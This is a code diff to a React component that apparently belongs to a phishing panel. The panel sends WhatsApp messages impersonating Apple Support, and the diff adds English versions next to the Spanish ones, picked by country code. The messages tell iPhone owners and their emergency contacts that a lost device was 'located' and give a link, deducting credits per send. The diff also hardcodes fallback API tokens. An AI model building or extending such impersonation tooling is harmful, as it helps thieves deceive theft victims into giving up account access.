@@ -6,6 +6,7 @@ import { toast } from '@/hooks/use-toast';
 import { Trash2, Send, RefreshCw, Edit } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { getIphoneImageUrl } from '@/utils/iphoneImages';
+import { getLanguageByCountryCode } from '@/utils/countries';
 
 interface Process {
   id: string;
@@ -186,19 +187,34 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       setSendingMessage(process.id);
       console.log('Sending WhatsApp message for process:', process.id);
 
-      // Obtener configuración de instancia
+      // Detectar idioma basado en el código de país
+      const language = getLanguageByCountryCode(process.country_code);
+      console.log('Detected language:', language, 'for country code:', process.country_code);
+
+      // Obtener configuración de instancia según el idioma
+      const settingKeys = language === 'en' 
+        ? ['whatsapp_instance_en', 'whatsapp_token_en']
+        : ['whatsapp_instance_es', 'whatsapp_token_es'];
+
       const { data: settings } = await supabase
         .from('system_settings')
         .select('*')
-        .in('setting_key', ['whatsapp_instance', 'whatsapp_token']);
+        .in('setting_key', settingKeys);
 
       const config = settings?.reduce((acc: any, setting: any) => {
         acc[setting.setting_key] = setting.setting_value;
         return acc;
       }, {});
 
-      const instanceId = config?.whatsapp_instance || 'instance126876';
-      const token = config?.whatsapp_token || '4ecj8581tubua7ry';
+      const instanceId = language === 'en' 
+        ? (config?.whatsapp_instance_en || 'instance126876')
+        : (config?.whatsapp_instance_es || 'instance126876');
+      
+      const token = language === 'en'
+        ? (config?.whatsapp_token_en || '4ecj8581tubua7ry')
+        : (config?.whatsapp_token_es || '4ecj8581tubua7ry');
+
+      console.log('Using instance:', instanceId, 'for language:', language);
 
       // Obtener la URL de la imagen del iPhone basada en modelo y color
       const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
@@ -208,17 +224,98 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       const imageExists = await checkImageExists(imageUrl);
       console.log('Image exists:', imageExists);
 
-      // Crear el mensaje personalizado según el tipo de contacto y modo perdido
+      // Crear el mensaje personalizado según el idioma, tipo de contacto y modo perdido
       let message = '';
       
-      // Determinar el texto de estado según el modo perdido
-      const statusText = process.lost_mode 
-        ? '✅ iPhone en modo perdido localizado con éxito' 
-        : '✅ iPhone localizado con éxito';
-      
-      if (process.contact_type === 'propietario') {
-        if (process.owner_name) {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+      if (language === 'en') {
+        // Mensajes en inglés
+        const statusText = process.lost_mode 
+          ? '✅ iPhone in lost mode successfully located' 
+          : '✅ iPhone successfully located';
+        
+        if (process.contact_type === 'propietario') {
+          if (process.owner_name) {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*${statusText}*
+*👤 Owner: ${process.owner_name}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type the word Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          } else {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*${statusText}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type the word Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          }
+        } else {
+          if (process.owner_name) {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*🚨 You are an emergency contact for ${process.owner_name}*
+
+*${statusText}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type the word Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          } else {
+            message = `*Apple Support 👨🏽‍🔧*
+
+*🚨 You are an emergency contact*
+
+*${statusText}*
+
+*📱 Model:* ${process.iphone_model}
+*💾 Storage:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serial:* ${process.serial_number}
+
+*🧾 Type the word Menu to request assistance.*${process.url ? `
+
+*🔗 Link to view real-time location:* ${process.url}` : ''}
+
+*Copyright © 2025 Apple Inc. All rights reserved.*`;
+          }
+        }
+      } else {
+        // Mensajes en español (código existente)
+        const statusText = process.lost_mode 
+          ? '✅ iPhone en modo perdido localizado con éxito' 
+          : '✅ iPhone localizado con éxito';
+        
+        if (process.contact_type === 'propietario') {
+          if (process.owner_name) {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *${statusText}*
 *👤 Propietario: ${process.owner_name}*
@@ -234,8 +331,8 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        } else {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+          } else {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *${statusText}*
 
@@ -250,10 +347,10 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        }
-      } else {
-        if (process.owner_name) {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+          }
+        } else {
+          if (process.owner_name) {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *🚨 Eres un contacto de emergencia ${process.owner_name}*
 
@@ -270,8 +367,8 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        } else {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+          } else {
+            message = `*Soporte de Apple 👨🏽‍🔧*
 
 *🚨 Eres un contacto de emergencia*
 
@@ -288,6 +385,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
+          }
         }
       }
 
@@ -384,9 +482,10 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         }
 
         const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
+        const languageText = language === 'en' ? 'inglés' : 'español';
         toast({
           title: "Mensaje enviado",
-          description: `Mensaje ${messageType} enviado a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
+          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
         });
 
         // Recargar procesos
@@ -452,111 +551,117 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         </Card>
       ) : (
         <div className="space-y-4">
-          {processes.map((process) => (
-            <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
-              <CardHeader>
-                <div className="flex justify-between items-start">
-                  <div>
-                    <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
-                    <p className="text-blue-200/70 text-sm">
-                      {process.country_code} {process.phone_number} ({process.contact_type})
-                    </p>
-                    {process.owner_name && (
-                      <p className="text-blue-200/60 text-xs mt-1">
-                        {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
-                      </p>
-                    )}
-                    {process.lost_mode && (
-                      <p className="text-orange-400 text-xs mt-1 font-medium">
-                        📱 En modo perdido
-                      </p>
-                    )}
-                  </div>
-                  <div className="flex items-center space-x-2">
-                    <Badge 
-                      variant={process.status === 'enviado' ? 'default' : 'secondary'}
-                      className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
-                    >
-                      {process.status}
-                    </Badge>
-                    <div className="flex space-x-1">
-                      <Button
-                        size="sm"
-                        onClick={() => sendWhatsAppMessage(process)}
-                        disabled={sendingMessage === process.id || userCredits <= 0}
-                        className={`${
-                          userCredits <= 0 
-                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
-                            : 'bg-green-600/20 hover:bg-green-600/30 text-green-300'
-                        }`}
-                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Enviar mensaje"}
-                      >
-                        {sendingMessage === process.id ? (
-                          <RefreshCw className="h-4 w-4 animate-spin" />
-                        ) : (
-                          <Send className="h-4 w-4" />
-                        )}
-                      </Button>
-                      <Button
-                        size="sm"
-                        onClick={() => deleteProcess(process.id)}
-                        className="bg-red-600/20 hover:bg-red-600/30 text-red-300"
-                        title="Eliminar proceso"
-                      >
-                        <Trash2 className="h-4 w-4" />
-                      </Button>
-                    </div>
-                  </div>
-                </div>
-              </CardHeader>
-              <CardContent>
-                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
-                  <div>
-                    <p className="text-blue-200/50">Modelo:</p>
-                    <p className="text-blue-200">{process.iphone_model}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Almacenamiento:</p>
-                    <p className="text-blue-200">{process.storage}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Color:</p>
-                    <p className="text-blue-200">{process.color}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">IMEI:</p>
-                    <p className="text-blue-200">{process.imei}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Número de Serie:</p>
-                    <p className="text-blue-200">{process.serial_number}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Tipo de Contacto:</p>
-                    <p className="text-blue-200">{process.contact_type}</p>
-                  </div>
-                  {process.owner_name && (
+          {processes.map((process) => {
+            const detectedLanguage = getLanguageByCountryCode(process.country_code);
+            return (
+              <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
+                <CardHeader>
+                  <div className="flex justify-between items-start">
                     <div>
-                      <p className="text-blue-200/50">
-                        {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
+                      <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
+                      <p className="text-blue-200/70 text-sm">
+                        {process.country_code} {process.phone_number} ({process.contact_type})
                       </p>
-                      <p className="text-blue-200">{process.owner_name}</p>
+                      {process.owner_name && (
+                        <p className="text-blue-200/60 text-xs mt-1">
+                          {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
+                        </p>
+                      )}
+                      {process.lost_mode && (
+                        <p className="text-orange-400 text-xs mt-1 font-medium">
+                          📱 En modo perdido
+                        </p>
+                      )}
+                      <p className="text-xs mt-1 font-medium">
+                        {detectedLanguage === 'en' ? '🇺🇸 Inglés' : '🇪🇸 Español'} - Enviará automáticamente
+                      </p>
                     </div>
-                  )}
-                  {process.url && (
-                    <div className="md:col-span-2 lg:col-span-3">
-                      <p className="text-blue-200/50">URL:</p>
-                      <p className="text-blue-200 break-all">{process.url}</p>
+                    <div className="flex items-center space-x-2">
+                      <Badge 
+                        variant={process.status === 'enviado' ? 'default' : 'secondary'}
+                        className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
+                      >
+                        {process.status}
+                      </Badge>
+                      <div className="flex space-x-1">
+                        <Button
+                          size="sm"
+                          onClick={() => sendWhatsAppMessage(process)}
+                          disabled={sendingMessage === process.id || userCredits <= 0}
+                          className={`${
+                            userCredits <= 0 
+                              ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
+                              : 'bg-green-600/20 hover:bg-green-600/30 text-green-300'
+                          }`}
+                          title={userCredits <= 0 ? "Sin créditos suficientes" : `Enviar mensaje en ${detectedLanguage === 'en' ? 'inglés' : 'español'}`}
+                        >
+                          {sendingMessage === process.id ? (
+                            <RefreshCw className="h-4 w-4 animate-spin" />
+                          ) : (
+                            <Send className="h-4 w-4" />
+                          )}
+                        </Button>
+                        <Button
+                          size="sm"
+                          onClick={() => deleteProcess(process.id)}
+                          className="bg-red-600/20 hover:bg-red-600/30 text-red-300"
+                          title="Eliminar proceso"
+                        >
+                          <Trash2 className="h-4 w-4" />
+                        </Button>
+                      </div>
                     </div>
-                  )}
-                  <div className="md:col-span-2 lg:col-span-3">
-                    <p className="text-blue-200/50">Creado:</p>
-                    <p className="text-blue-200">{new Date(process.created_at).toLocaleString()}</p>
                   </div>
-                </div>
-              </CardContent>
-            </Card>
-          ))}
+                </CardHeader>
+                <CardContent>
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
+                    <div>
+                      <p className="text-blue-200/50">Modelo:</p>
+                      <p className="text-blue-200">{process.iphone_model}</p>
+                    </div>
+                    <div>
+                      <p className="text-blue-200/50">Almacenamiento:</p>
+                      <p className="text-blue-200">{process.storage}</p>
+                    </div>
+                    <div>
+                      <p className="text-blue-200/50">Color:</p>
+                      <p className="text-blue-200">{process.color}</p>
+                    </div>
+                    <div>
+                      <p className="text-blue-200/50">IMEI:</p>
+                      <p className="text-blue-200">{process.imei}</p>
+                    </div>
+                    <div>
+                      <p className="text-blue-200/50">Número de Serie:</p>
+                      <p className="text-blue-200">{process.serial_number}</p>
+                    </div>
+                    <div>
+                      <p className="text-blue-200/50">Tipo de Contacto:</p>
+                      <p className="text-blue-200">{process.contact_type}</p>
+                    </div>
+                    {process.owner_name && (
+                      <div>
+                        <p className="text-blue-200/50">
+                          {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
+                        </p>
+                        <p className="text-blue-200">{process.owner_name}</p>
+                      </div>
+                    )}
+                    {process.url && (
+                      <div className="md:col-span-2 lg:col-span-3">
+                        <p className="text-blue-200/50">URL:</p>
+                        <p className="text-blue-200 break-all">{process.url}</p>
+                      </div>
+                    )}
+                    <div className="md:col-span-2 lg:col-span-3">
+                      <p className="text-blue-200/50">Creado:</p>
+                      <p className="text-blue-200">{new Date(process.created_at).toLocaleString()}</p>
+                    </div>
+                  </div>
+                </CardContent>
+              </Card>
+            );
+          })}
         </div>
       )}
     </div>
